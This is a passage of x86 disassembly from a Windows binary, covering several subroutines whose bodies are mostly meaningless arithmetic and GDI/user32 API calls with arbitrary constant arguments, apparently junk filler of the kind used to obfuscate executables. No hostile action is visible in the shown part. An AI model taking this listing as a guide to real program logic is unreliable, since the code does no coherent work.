		add	eax, [ebp+var_25C]
		add	eax, y
		mov	[ebp+var_1C0], eax

loc_40E5FA:				; CODE XREF: sub_409DF0+12B9j
		mov	ecx, [ebp+hdc]
		mov	[ebp+hdc], ecx
		mov	edx, [ebp+var_FC]
		add	edx, 4Bh
		movzx	eax, [ebp+var_F0]
		sub	edx, eax
		movzx	ecx, [ebp+var_D4]
		sub	edx, ecx
		mov	[ebp+var_EC], dx
		mov	byte ptr [ebp+hemf], 32h
		mov	edx, [ebp+wFirst]
		mov	[ebp+var_218], edx
		movzx	eax, [ebp+var_1D1]
		add	eax, [ebp+pvOut]
		mov	[ebp+wFirst], eax
		mov	[ebp+var_FC], 63h
		mov	cl, [ebp+var_D5]
		mov	[ebp+var_1C5], cl
		mov	ebx, [ebp+top]
		add	ebx, [ebp+pgui]
		add	ebx, [ebp+top]
		push	1Fh		; lpABC
		mov	edx, [ebp+hdc]
		push	edx		; iLast
		push	56h		; iFirst
		mov	eax, [ebp+var_FC]
		push	eax		; hdc
		call	ds:GetCharABCWidthsFloatA
		sub	ebx, eax
		or	ebx, [ebp+pvIn]
		mov	[ebp+var_99], bl
		mov	ecx, [ebp+hemf]
		mov	[ebp+var_228], ecx
		push	56h		; diFlags
		mov	edx, [ebp+var_AC]
		push	edx		; hbrFlickerFreeDraw
		mov	eax, [ebp+var_AC]
		push	eax		; istepIfAniCur
		push	0Eh		; cyWidth
		push	15h		; cxWidth
		push	20h		; hIcon
		mov	ecx, [ebp+pvOut]
		push	ecx		; yTop
		push	51h		; xLeft
		mov	edx, [ebp+wFirst]
		push	edx		; hdc
		call	ds:DrawIconEx
		mov	[ebp+pvIn], eax
		mov	eax, [ebp+pvOut]
		sub	eax, 3Eh
		movzx	ecx, [ebp+var_11D]
		and	ecx, 5Ch
		or	eax, ecx
		mov	[ebp+var_6], al
		mov	edx, [ebp+var_FC]
		mov	[ebp+var_188], edx
		movzx	eax, [ebp+var_6]
		and	eax, [ebp+hdc]
		mov	[ebp+pgui], eax
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn
sub_409DF0	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40E710	proc near		; CODE XREF: sub_402C40+2BDp

var_260		= dword	ptr -260h
var_250		= dword	ptr -250h
var_24C		= dword	ptr -24Ch
var_248		= dword	ptr -248h
var_244		= word ptr -244h
var_238		= dword	ptr -238h
var_224		= dword	ptr -224h
var_210		= dword	ptr -210h
var_1A0		= word ptr -1A0h
var_19C		= word ptr -19Ch
var_198		= word ptr -198h
var_140		= dword	ptr -140h
var_13C		= dword	ptr -13Ch
var_124		= dword	ptr -124h
var_120		= dword	ptr -120h
var_119		= byte ptr -119h
var_114		= dword	ptr -114h
var_EC		= dword	ptr -0ECh
var_E5		= byte ptr -0E5h
var_E4		= word ptr -0E4h
var_DC		= word ptr -0DCh
var_D8		= dword	ptr -0D8h
var_C8		= dword	ptr -0C8h
var_B4		= word ptr -0B4h
var_9C		= dword	ptr -9Ch
var_98		= dword	ptr -98h
var_8C		= dword	ptr -8Ch
var_19		= byte ptr -19h
var_18		= word ptr -18h
var_14		= word ptr -14h
var_C		= word ptr -0Ch
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h
arg_10		= dword	ptr  18h

		push	ebp
		mov	ebp, esp
		sub	esp, 260h
		push	3Ah		; hdc
		call	ds:GetDCBrushColor
		add	eax, 9
		xor	eax, 4Eh
		mov	[ebp+var_9C], eax
		mov	eax, [ebp+arg_0]
		mov	[ebp+var_EC], eax
		mov	ecx, [ebp+arg_8]
		mov	[ebp+var_210], ecx
		mov	[ebp+var_124], 12h
		mov	[ebp+var_24C], 21h
		mov	edx, 17h
		sub	edx, [ebp+var_C8]
		and	edx, 18h
		mov	[ebp+var_244], dx
		movzx	eax, [ebp+var_19C]
		sub	eax, 20h
		mov	ecx, dword_42C038
		sub	ecx, eax
		mov	dword_42C038, ecx
		lea	edx, [ebp+var_EC]
		sub	edx, 4Eh
		movzx	eax, byte ptr [edx]
		mov	[ebp+var_250], eax
		mov	ecx, [ebp+var_98]
		mov	[ebp+var_13C], ecx
		mov	edx, [ebp+var_EC]
		add	edx, 18h
		mov	[ebp+var_1A0], dx
		mov	[ebp+var_124], 2Eh
		movzx	eax, [ebp+var_244]
		mov	ecx, [ebp+var_24C]
		lea	edx, [ecx+eax-27h]
		mov	[ebp+var_D8], edx
		mov	byte ptr [ebp+arg_0], 41h
		mov	[ebp+var_224], 6
		movzx	eax, [ebp+var_19]
		mov	[ebp+var_C8], eax
		mov	[ebp+arg_4], 41h
		movzx	ecx, [ebp+var_E5]
		sub	ecx, 0Ch
		sub	ecx, [ebp+var_114]
		mov	edx, [ebp+var_8C]
		sub	edx, 26h
		xor	ecx, edx
		mov	[ebp+var_119], cl
		mov	[ebp+var_260], 0
		jmp	short loc_40E82A
; ---------------------------------------------------------------------------

loc_40E81B:				; CODE XREF: sub_40E710+192j
		mov	eax, [ebp+var_260]
		add	eax, 1
		mov	[ebp+var_260], eax

loc_40E82A:				; CODE XREF: sub_40E710+109j
		cmp	[ebp+var_260], 6
		jge	short loc_40E8A7
		mov	ecx, 0Dh
		sub	ecx, [ebp+var_120]
		movzx	edx, [ebp+var_E4]
		add	ecx, edx
		or	ecx, [ebp+arg_10]
		mov	[ebp+var_E4], cx
		mov	eax, dword_42C034
		imul	eax, 0Ah
		mov	dword_42C034, eax
		mov	[ebp+arg_0], 3Eh
		mov	[ebp+var_140], 15h
		movzx	ecx, [ebp+var_C]
		add	ecx, [ebp+arg_10]
		and	ecx, 3Bh
		movzx	edx, [ebp+var_198]
		sub	edx, ecx
		mov	[ebp+var_198], dx
		movzx	eax, [ebp+var_B4]
		xor	eax, 41h
		mov	ecx, [ebp+var_24C]
		sub	ecx, 42h
		xor	eax, ecx
		mov	[ebp+var_18], ax
		jmp	loc_40E81B
; ---------------------------------------------------------------------------

loc_40E8A7:				; CODE XREF: sub_40E710+121j
		mov	edx, [ebp+arg_C]
		add	edx, 45h
		and	edx, [ebp+var_EC]
		mov	[ebp+var_DC], dx
		mov	eax, [ebp+arg_0]
		add	eax, 1Ah
		sub	eax, [ebp+var_250]
		mov	[ebp+var_238], eax
		movzx	ecx, [ebp+var_E5]
		mov	[ebp+arg_10], ecx
		mov	edx, [ebp+var_248]
		mov	eax, [ebp+var_248]
		lea	ecx, [eax+edx-4]
		mov	[ebp+var_14], cx
		mov	edx, [ebp+arg_4]
		mov	[ebp+arg_C], edx
		mov	eax, [ebp+var_EC]
		mov	esp, ebp
		pop	ebp
		retn
sub_40E710	endp

; ---------------------------------------------------------------------------
		align 10h
		push	ebp
		mov	ebp, esp
		sub	esp, 244h
		push	esi
		mov	eax, [ebp+0Ch]
		and	eax, 3Ah
		and	eax, [ebp+14h]
		mov	[ebp-4], eax
		movzx	ecx, byte ptr [ebp-102h]
		cmp	ecx, 0Bh
		jl	short loc_40E933
		mov	edx, [ebp+14h]
		add	edx, 9Bh
		mov	[ebp-0D8h], edx
		jmp	short loc_40E952
; ---------------------------------------------------------------------------

loc_40E933:				; CODE XREF: .text:0040E920j
		mov	eax, [ebp-0B0h]
		add	eax, 50h
		movzx	ecx, byte ptr [ebp-0D1h]
		xor	eax, ecx
		mov	[ebp-8Ch], eax
		mov	dword ptr [ebp+10h], 63h

loc_40E952:				; CODE XREF: .text:0040E931j
		mov	edx, [ebp-184h]
		mov	[ebp-14Ch], edx
		movzx	eax, word ptr [ebp-194h]
		mov	[ebp-244h], eax
		mov	ecx, [ebp-4]
		mov	[ebp-240h], ecx
		mov	dword ptr [ebp+18h], 1Fh
		mov	edx, [ebp-0C4h]
		add	edx, [ebp+0Ch]
		sub	edx, [ebp-188h]
		add	edx, [ebp+8]
		mov	[ebp-0F0h], dx
		mov	eax, [ebp+10h]
		push	eax
		mov	ecx, [ebp+18h]
		push	ecx
		mov	edx, [ebp+8]
		push	edx
		mov	eax, [ebp+18h]
		push	eax
		mov	ecx, [ebp-240h]
		push	ecx
		call	sub_40F1F0
		add	esp, 14h
		movzx	edx, word ptr [ebp-0B4h]
		sub	edx, [ebp-0B0h]
		sub	edx, [ebp-240h]
		sub	edx, [ebp-184h]
		xor	eax, edx
		mov	[ebp-91h], al
		movzx	eax, word ptr [ebp-1ACh]
		add	eax, 47h
		movzx	ecx, byte ptr [ebp-0B5h]
		sub	eax, ecx
		mov	[ebp-9Ch], ax
		mov	edx, [ebp+0Ch]
		add	edx, 20h
		xor	edx, 31h
		or	edx, [ebp-184h]
		mov	[ebp-14h], dx
		mov	dword ptr [ebp-0A0h], 0A3h
		movzx	eax, byte ptr [ebp-101h]
		add	eax, 97h
		sub	eax, [ebp+8]
		mov	[ebp-0ECh], ax
		movzx	ecx, byte ptr [ebp-0D1h]
		mov	[ebp+0Ch], ecx
		push	46h
		mov	edx, [ebp-188h]
		push	edx
		mov	eax, [ebp+1Ch]
		push	eax
		mov	ecx, [ebp+0Ch]
		push	ecx
		call	ds:SetWindowOrgEx
		sub	eax, 3
		mov	[ebp-0D8h], eax
		movzx	edx, word ptr [ebp-0CCh]
		xor	edx, [ebp-240h]
		mov	[ebp-244h], edx
		movzx	eax, word ptr [ebp-240h]
		mov	[ebp-244h], eax
		mov	ecx, [ebp-184h]
		mov	[ebp-16Ch], ecx
		mov	edx, [ebp-188h]
		mov	eax, [ebp-188h]
		lea	ecx, [eax+edx-1Ah]
		mov	[ebp-18h], cx
		movzx	edx, word ptr [ebp-0CCh]
		sub	edx, 10h
		mov	[ebp-0CCh], dx
		mov	eax, [ebp-184h]
		add	eax, 54h
		sub	eax, [ebp+0Ch]
		mov	[ebp-19h], al
		mov	ecx, [ebp-244h]
		sub	ecx, 21h
		mov	[ebp-0ECh], cx
		mov	edx, [ebp-188h]
		sub	edx, 20h
		movzx	eax, word ptr [ebp-14h]
		add	eax, 0Dh
		or	edx, eax
		mov	[ebp-101h], dl
		mov	esi, [ebp-244h]
		add	esi, 31h
		mov	ecx, [ebp+18h]
		push	ecx
		mov	edx, [ebp+10h]
		push	edx
		mov	eax, [ebp+1Ch]
		push	eax
		mov	ecx, [ebp+8]
		push	ecx
		mov	edx, [ebp-188h]
		push	edx
		call	sub_40F1F0
		add	esp, 14h
		add	eax, [ebp+0Ch]
		and	esi, eax
		mov	[ebp-1ACh], si
		mov	eax, [ebp+1Ch]
		add	eax, 45h
		xor	eax, 50h
		mov	[ebp-10h], eax
		mov	dword ptr [ebp-80h], 0Ah
		mov	ecx, [ebp+18h]
		add	ecx, [ebp-190h]
		mov	edx, [ebp-184h]
		add	edx, 19h
		and	edx, [ebp-0D8h]
		xor	ecx, edx
		mov	[ebp-91h], cl
		mov	eax, 3Eh
		sub	eax, [ebp-188h]
		sub	eax, 37h
		mov	[ebp-238h], eax
		movzx	ecx, word ptr [ebp-174h]
		movzx	edx, word ptr [ebp-1ACh]
		or	ecx, edx
		xor	ecx, dword_42C03C
		mov	dword_42C03C, ecx
		mov	eax, [ebp-240h]
		pop	esi
		mov	esp, ebp
		pop	ebp
		retn
; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40EB80	proc near		; CODE XREF: .text:0040764Ap
					; sub_4092F0+2A0p

var_265		= byte ptr -265h
var_260		= dword	ptr -260h
var_258		= word ptr -258h
var_254		= dword	ptr -254h
var_230		= dword	ptr -230h
var_208		= dword	ptr -208h
var_1D4		= dword	ptr -1D4h
var_1CC		= dword	ptr -1CCh
var_1C5		= byte ptr -1C5h
var_1B4		= dword	ptr -1B4h
var_1A4		= dword	ptr -1A4h
var_1A0		= word ptr -1A0h
var_164		= dword	ptr -164h
var_14C		= dword	ptr -14Ch
var_148		= dword	ptr -148h
var_120		= word ptr -120h
var_114		= dword	ptr -114h
var_10D		= byte ptr -10Dh
var_10C		= word ptr -10Ch
var_F4		= dword	ptr -0F4h
var_E8		= dword	ptr -0E8h
var_E1		= byte ptr -0E1h
var_D4		= dword	ptr -0D4h
var_B4		= word ptr -0B4h
var_A4		= dword	ptr -0A4h
var_A0		= dword	ptr -0A0h
var_99		= byte ptr -99h
var_60		= dword	ptr -60h
var_24		= dword	ptr -24h
var_18		= word ptr -18h
var_14		= dword	ptr -14h
var_7		= byte ptr -7
var_6		= byte ptr -6
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h
arg_10		= dword	ptr  18h
arg_14		= dword	ptr  1Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 26Ch
		mov	eax, dword_42C058
		and	eax, 22h
		mov	dword_42C058, eax
		mov	ecx, [ebp+arg_8]
		push	ecx
		mov	edx, [ebp+arg_0]
		push	edx
		mov	eax, [ebp+arg_4]
		push	eax
		mov	ecx, [ebp+var_114]
		push	ecx
		mov	edx, [ebp+arg_4]
		push	edx
		call	sub_40EFA0
		add	esp, 14h
		mov	ecx, [ebp+var_1D4]
		sub	ecx, eax
		mov	edx, [ebp+arg_0]
		lea	eax, [ecx+edx-46h]
		mov	[ebp+var_258], ax
		movzx	ecx, [ebp+var_265]
		sub	ecx, 33h
		mov	dword_42C034, ecx
		mov	edx, [ebp+var_1A4]
		add	edx, [ebp+var_4]
		xor	edx, 36h
		mov	eax, [ebp+arg_10]
		add	eax, 56h
		or	edx, eax
		mov	[ebp+var_10D], dl
		cmp	dword_42C010, 3Bh
		jl	short loc_40EC1D
		mov	ecx, [ebp+var_260]
		xor	ecx, 2Fh
		xor	ecx, [ebp+var_24]
		mov	[ebp+var_1A0], cx
		mov	edx, [ebp+var_1CC]
		sub	edx, [ebp+arg_8]
		mov	[ebp+arg_4], edx

loc_40EC1D:				; CODE XREF: sub_40EB80+7Cj
		mov	[ebp+var_164], 4
		mov	[ebp+arg_8], 13h
		mov	eax, [ebp+arg_C]
		sub	eax, [ebp+var_A4]
		mov	[ebp+var_24], eax
		mov	cl, byte ptr [ebp+var_A0]
		mov	byte ptr [ebp+arg_14], cl
		mov	edx, [ebp+var_260]
		mov	[ebp+var_60], edx
		mov	eax, [ebp+var_114]
		xor	eax, [ebp+var_14]
		mov	[ebp+arg_4], eax
		mov	ecx, [ebp+var_260]
		mov	[ebp+arg_14], ecx
		mov	edx, [ebp+arg_8]
		push	edx
		mov	eax, [ebp+var_260]
		push	eax
		mov	ecx, [ebp+var_A0]
		push	ecx
		mov	edx, [ebp+var_F4]
		push	edx
		mov	eax, [ebp+arg_8]
		push	eax
		call	sub_410210
		add	esp, 14h
		add	eax, [ebp+arg_4]
		mov	[ebp+var_F4], eax
		mov	ecx, [ebp+var_1A4]
		add	ecx, [ebp+var_254]
		sub	ecx, [ebp+var_260]
		sub	ecx, [ebp+var_A4]
		mov	[ebp+var_120], cx
		movzx	edx, [ebp+var_E1]
		mov	[ebp+var_260], edx
		mov	eax, 12h
		mov	word ptr [ebp+var_260],	ax
		mov	[ebp+var_230], 33h
		movzx	ecx, [ebp+var_B4]
		mov	edx, [ebp+var_A0]
		sub	edx, [ebp+arg_C]
		movzx	eax, [ebp+var_1C5]
		add	edx, eax
		sub	edx, [ebp+var_1A4]
		or	ecx, edx
		mov	[ebp+var_265], cl
		mov	ecx, [ebp+var_254]
		add	ecx, [ebp+var_24]
		or	ecx, [ebp+var_E8]
		mov	[ebp+var_254], ecx
		lea	edx, [ebp+var_114]
		sub	edx, 4
		movzx	eax, byte ptr [edx]
		mov	[ebp+arg_10], eax
		mov	ecx, [ebp+var_1CC]
		mov	[ebp+var_14C], ecx
		mov	edx, [ebp+arg_C]
		sub	edx, 94h
		xor	edx, [ebp+var_E8]
		mov	[ebp+var_10C], dx
		mov	eax, [ebp+var_1B4]
		sub	eax, 1Dh
		mov	[ebp+var_D4], eax
		mov	ecx, 4Dh
		mov	[ebp+var_18], cx
		mov	dword_42C038, 31h
		mov	edx, [ebp+arg_0]
		mov	[ebp+var_208], edx
		movzx	eax, [ebp+var_6]
		xor	eax, 4Dh
		xor	eax, 18h
		mov	[ebp+var_99], al
		movzx	ecx, [ebp+var_7]
		sub	ecx, 39h
		mov	edx, dword_42C03C
		sub	edx, ecx
		mov	dword_42C03C, edx
		mov	eax, [ebp+arg_14]
		mov	[ebp+var_148], eax
		movzx	ecx, [ebp+var_10C]
		add	ecx, 1Fh
		mov	[ebp+var_114], ecx
		mov	edx, dword_42C050
		add	edx, [ebp+arg_10]
		mov	dword_42C050, edx
		mov	eax, [ebp+arg_8]
		add	eax, 5Ch
		mov	[ebp+var_1A4], eax
		mov	eax, [ebp+var_F4]
		mov	esp, ebp
		pop	ebp
		retn
sub_40EB80	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_40EDD0(int, HANDLE hProcess, int, int, int, int)
sub_40EDD0	proc near		; CODE XREF: .text:00408DBEp

var_249		= byte ptr -249h
var_240		= word ptr -240h
var_1E4		= dword	ptr -1E4h
var_1D4		= dword	ptr -1D4h
var_1B4		= dword	ptr -1B4h
hdc		= dword	ptr -1ACh
var_198		= word ptr -198h
var_15C		= dword	ptr -15Ch
var_11A		= byte ptr -11Ah
var_114		= dword	ptr -114h
var_109		= byte ptr -109h
var_108		= word ptr -108h
var_E9		= byte ptr -0E9h
var_E0		= word ptr -0E0h
var_DC		= dword	ptr -0DCh
var_CC		= dword	ptr -0CCh
var_C0		= dword	ptr -0C0h
var_B0		= dword	ptr -0B0h
var_A0		= dword	ptr -0A0h
var_98		= dword	ptr -98h
var_91		= byte ptr -91h
var_90		= word ptr -90h
var_8C		= dword	ptr -8Ch
var_1A		= byte ptr -1Ah
var_19		= byte ptr -19h
var_18		= word ptr -18h
var_10		= dword	ptr -10h
var_7		= byte ptr -7
var_6		= byte ptr -6
arg_0		= dword	ptr  8
hProcess	= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h
arg_10		= dword	ptr  18h
arg_14		= dword	ptr  1Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 24Ch
		push	ebx
		push	esi
		movzx	eax, [ebp+var_1A]
		add	eax, [ebp+var_114]
		mov	[ebp+arg_0], eax
		mov	ecx, [ebp+arg_C]
		add	ecx, 13h
		sub	ecx, [ebp+var_98]
		sub	ecx, 2Ch
		mov	[ebp+var_249], cl
		mov	edx, [ebp+arg_10]
		mov	[ebp+var_1D4], edx
		mov	[ebp+var_CC], 5Ch
		mov	eax, [ebp+var_CC]
		mov	dword_42C048, eax
		movzx	ecx, [ebp+var_91]
		or	ecx, 28h
		mov	[ebp+var_240], cx
		movzx	edx, [ebp+var_E0]
		sub	edx, 4Dh
		mov	[ebp+var_E0], dx
		movzx	eax, [ebp+var_18]
		add	eax, 6Ch
		movzx	ecx, [ebp+var_90]
		add	ecx, 2Ah
		or	eax, ecx
		mov	[ebp+var_19], al
		mov	edx, [ebp+arg_8]
		mov	[ebp+var_15C], edx
		movzx	eax, [ebp+var_6]
		add	eax, [ebp+arg_C]
		movzx	ecx, [ebp+var_7]
		lea	edx, [eax+ecx-31h]
		mov	[ebp+var_108], dx
		mov	[ebp+var_1E4], 4
		mov	eax, [ebp+var_C0]
		mov	[ebp+var_DC], eax
		mov	ecx, [ebp+hProcess]
		push	ecx		; hProcess
		call	ds:GetPriorityClass
		add	eax, [ebp+arg_8]
		or	eax, [ebp+arg_14]
		mov	[ebp+var_8C], eax
		mov	edx, [ebp+var_C0]
		sub	edx, 0Eh
		movzx	eax, [ebp+var_198]
		sub	edx, eax
		mov	[ebp+var_A0], edx
		mov	ecx, [ebp+arg_8]
		add	ecx, 48h
		mov	[ebp+arg_0], ecx
		movzx	ebx, [ebp+var_11A]
		mov	edx, [ebp+hProcess]
		push	edx
		call	sub_40FC00
		add	esp, 4
		mov	esi, eax
		mov	eax, [ebp+var_98]
		push	eax
		mov	ecx, [ebp+var_CC]
		push	ecx
		mov	edx, [ebp+arg_14]
		push	edx
		mov	eax, [ebp+arg_14]
		push	eax
		mov	ecx, [ebp+arg_C]
		push	ecx
		call	sub_40EFA0
		add	esp, 14h
		add	esi, [ebp+arg_14]
		lea	edx, [eax+esi-24h]
		xor	ebx, edx
		mov	[ebp+var_E9], bl
		mov	eax, [ebp+arg_14]
		sub	eax, 57h
		mov	[ebp+arg_10], eax
		mov	ecx, [ebp+hdc]
		push	ecx		; int
		mov	edx, [ebp+arg_C]
		push	edx		; int
		mov	eax, [ebp+arg_0]
		push	eax		; int
		mov	ecx, [ebp+hdc]
		push	ecx		; hdc
		mov	edx, [ebp+arg_0]
		push	edx		; int
		mov	eax, [ebp+arg_0]
		push	eax		; int
		call	sub_40FF80
		add	esp, 18h
		movzx	ecx, [ebp+var_7]
		add	eax, ecx
		sub	eax, [ebp+var_1B4]
		mov	[ebp+var_A0], eax
		mov	edx, [ebp+arg_14]
		sub	edx, 26h
		sub	edx, [ebp+var_CC]
		sub	edx, 47h
		or	edx, 1Eh
		mov	[ebp+var_109], dl
		movzx	eax, [ebp+var_198]
		sub	eax, [ebp+hProcess]
		sub	eax, 5Eh
		mov	[ebp+var_10], eax
		mov	ecx, [ebp+arg_C]
		sub	ecx, 19h
		mov	[ebp+var_B0], ecx
		mov	edx, [ebp+arg_10]
		or	edx, 28h
		mov	[ebp+arg_10], edx
		mov	eax, dword_42C054
		imul	eax, [ebp+hProcess]
		mov	dword_42C054, eax
		mov	eax, [ebp+hdc]
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn
sub_40EDD0	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40EFA0	proc near		; CODE XREF: sub_40EB80+2Dp
					; sub_40EDD0+11Ep

var_244		= dword	ptr -244h
var_240		= dword	ptr -240h
var_239		= byte ptr -239h
var_230		= word ptr -230h
var_21C		= word ptr -21Ch
var_200		= dword	ptr -200h
var_1AC		= word ptr -1ACh
var_195		= byte ptr -195h
var_188		= word ptr -188h
var_134		= dword	ptr -134h
var_110		= dword	ptr -110h
var_108		= word ptr -108h
var_104		= dword	ptr -104h
var_F9		= byte ptr -0F9h
var_F8		= word ptr -0F8h
var_F4		= word ptr -0F4h
var_E4		= dword	ptr -0E4h
var_DD		= byte ptr -0DDh
var_DC		= dword	ptr -0DCh
var_D4		= word ptr -0D4h
var_D0		= word ptr -0D0h
var_C8		= dword	ptr -0C8h
var_C0		= word ptr -0C0h
var_B9		= byte ptr -0B9h
var_AC		= dword	ptr -0ACh
var_A8		= word ptr -0A8h
var_A4		= dword	ptr -0A4h
var_98		= dword	ptr -98h
var_8C		= dword	ptr -8Ch
var_7C		= dword	ptr -7Ch
var_1A		= byte ptr -1Ah
var_18		= word ptr -18h
var_14		= word ptr -14h
var_7		= byte ptr -7
var_5		= byte ptr -5
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h
arg_10		= dword	ptr  18h

		push	ebp
		mov	ebp, esp
		sub	esp, 244h
		mov	[ebp+var_244], 0
		jmp	short loc_40EFC4
; ---------------------------------------------------------------------------

loc_40EFB5:				; CODE XREF: sub_40EFA0+B4j
		mov	eax, [ebp+var_244]
		add	eax, 1
		mov	[ebp+var_244], eax

loc_40EFC4:				; CODE XREF: sub_40EFA0+13j
		cmp	[ebp+var_244], 0Dh
		jge	loc_40F059
		movzx	ecx, [ebp+var_D4]
		movzx	edx, [ebp+var_F8]
		sub	ecx, edx
		add	ecx, 5Dh
		mov	[ebp+var_A4], ecx
		mov	[ebp+arg_10], 39h
		mov	eax, 3Fh
		sub	eax, [ebp+arg_10]
		add	eax, 0Bh
		mov	[ebp+var_18], ax
		movzx	ecx, [ebp+var_F8]
		add	ecx, 0A9h
		mov	edx, [ebp+var_C8]
		add	edx, 2Ah
		or	ecx, edx
		mov	[ebp+var_195], cl
		mov	eax, dword_42C03C
		sub	eax, 34h
		mov	dword_42C03C, eax
		mov	ecx, [ebp+var_110]
		sub	ecx, [ebp+var_98]
		mov	[ebp+var_AC], ecx
		movzx	edx, [ebp+var_C0]
		movzx	eax, [ebp+var_D0]
		add	eax, edx
		mov	[ebp+var_D0], ax
		jmp	loc_40EFB5
; ---------------------------------------------------------------------------

loc_40F059:				; CODE XREF: sub_40EFA0+2Bj
		movzx	ecx, [ebp+var_1AC]
		or	ecx, 30h
		mov	[ebp+var_1AC], cx
		mov	edx, [ebp+arg_10]
		add	edx, 50h
		mov	[ebp+var_AC], edx
		mov	eax, [ebp+var_98]
		add	eax, [ebp+arg_8]
		movzx	ecx, [ebp+var_D4]
		add	eax, ecx
		sub	eax, [ebp+arg_C]
		or	eax, [ebp+var_E4]
		mov	[ebp+var_B9], al
		mov	edx, 3Ah
		sub	edx, [ebp+arg_4]
		mov	[ebp+var_240], edx
		movzx	eax, [ebp+var_F4]
		xor	eax, 49h
		mov	[ebp+var_8C], eax
		movzx	ecx, [ebp+var_21C]
		add	ecx, 1Eh
		mov	[ebp+var_21C], cx
		mov	edx, 5Bh
		sub	edx, [ebp+arg_0]
		movzx	eax, [ebp+var_108]
		mov	ecx, [ebp+arg_4]
		sub	ecx, eax
		and	edx, ecx
		mov	[ebp+var_230], dx
		mov	edx, [ebp+arg_0]
		add	edx, 13h
		and	edx, dword_42C044
		mov	dword_42C044, edx
		mov	eax, [ebp+var_DC]
		mov	[ebp+arg_4], eax
		mov	ecx, [ebp+arg_C]
		mov	[ebp+var_E4], ecx
		movzx	edx, [ebp+var_195]
		mov	eax, 63h
		sub	eax, edx
		movzx	ecx, [ebp+var_5]
		add	eax, ecx
		mov	[ebp+var_104], eax
		movzx	edx, [ebp+var_7]
		mov	eax, 22h
		sub	eax, edx
		mov	[ebp+var_104], eax
		movzx	ecx, [ebp+var_A8]
		movzx	edx, [ebp+var_14]
		lea	eax, [ecx+edx-2Bh]
		movzx	ecx, [ebp+var_F9]
		and	eax, ecx
		xor	eax, [ebp+arg_10]
		mov	[ebp+var_DD], al
		mov	byte ptr [ebp+var_AC], 5Bh
		mov	[ebp+var_7C], 53h
		mov	[ebp+arg_10], 0FFFFFFFEh
		mov	[ebp+arg_0], 10h
		mov	edx, [ebp+arg_8]
		sub	edx, 23h
		mov	[ebp+var_AC], edx
		mov	eax, dword_42C054
		sub	eax, 16h
		mov	dword_42C054, eax
		lea	ecx, [ebp+var_E4]
		sub	ecx, 5Dh
		mov	edx, [ecx]
		mov	[ebp+arg_4], edx
		mov	[ebp+var_134], 5Ah
		mov	eax, [ebp+arg_10]
		add	eax, 61h
		movzx	ecx, [ebp+var_188]
		sub	eax, ecx
		movzx	edx, [ebp+var_239]
		add	eax, edx
		and	eax, 36h
		mov	[ebp+var_1A], al
		mov	[ebp+var_200], 1Fh
		mov	eax, 64h
		sub	eax, [ebp+arg_4]
		add	eax, [ebp+arg_10]
		sub	eax, [ebp+var_AC]
		mov	[ebp+var_D0], ax
		mov	eax, [ebp+var_240]
		mov	esp, ebp
		pop	ebp
		retn
sub_40EFA0	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_40F1F0(int, int, HWND	hWnd, int, int)
sub_40F1F0	proc near		; CODE XREF: sub_408650+175p
					; .text:0040E9ABp ...

var_23C		= word ptr -23Ch
var_234		= dword	ptr -234h
var_230		= dword	ptr -230h
var_1E4		= dword	ptr -1E4h
var_1C4		= dword	ptr -1C4h
var_1AD		= byte ptr -1ADh
var_1AC		= dword	ptr -1ACh
var_1A0		= word ptr -1A0h
var_194		= dword	ptr -194h
var_190		= word ptr -190h
var_188		= word ptr -188h
var_154		= dword	ptr -154h
var_110		= dword	ptr -110h
var_108		= word ptr -108h
var_104		= dword	ptr -104h
fByPos		= dword	ptr -0FCh
var_F6		= byte ptr -0F6h
var_F5		= byte ptr -0F5h
var_E4		= word ptr -0E4h
gmdiFlags	= dword	ptr -0E0h
var_D8		= dword	ptr -0D8h
var_D1		= byte ptr -0D1h
var_B0		= dword	ptr -0B0h
var_A8		= word ptr -0A8h
var_A4		= dword	ptr -0A4h
var_91		= byte ptr -91h
var_C		= dword	ptr -0Ch
var_7		= byte ptr -7
var_6		= byte ptr -6
var_5		= byte ptr -5
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
hWnd		= dword	ptr  10h
arg_C		= dword	ptr  14h
arg_10		= dword	ptr  18h

		push	ebp
		mov	ebp, esp
		sub	esp, 244h
		push	esi
		mov	eax, [ebp+gmdiFlags]
		push	eax
		mov	ecx, [ebp+arg_4]
		push	ecx
		call	sub_4100E0
		add	esp, 8
		mov	esi, eax
		mov	edx, [ebp+gmdiFlags]
		push	edx		; gmdiFlags
		mov	eax, [ebp+fByPos]
		push	eax		; fByPos
		push	0Bh		; hMenu
		call	ds:GetMenuDefaultItem
		lea	ecx, [esi+eax-66h]
		or	ecx, 2Fh
		mov	[ebp+var_F5], cl
		mov	[ebp+var_1E4], 39h
		movzx	edx, [ebp+var_7]
		and	edx, [ebp+var_230]
		mov	[ebp+arg_0], edx
		movzx	eax, [ebp+var_D1]
		add	eax, [ebp+arg_4]
		imul	eax, dword_42C048
		mov	dword_42C048, eax
		movzx	ecx, [ebp+var_91]
		movzx	edx, [ebp+var_6]
		add	edx, 53h
		xor	ecx, edx
		mov	[ebp+var_4], ecx
		movzx	eax, [ebp+var_E4]
		movzx	ecx, [ebp+var_A8]
		sub	eax, ecx
		add	eax, dword_42C054
		mov	dword_42C054, eax
		movzx	edx, byte ptr [ebp+arg_4+2]
		mov	[ebp+var_C], edx
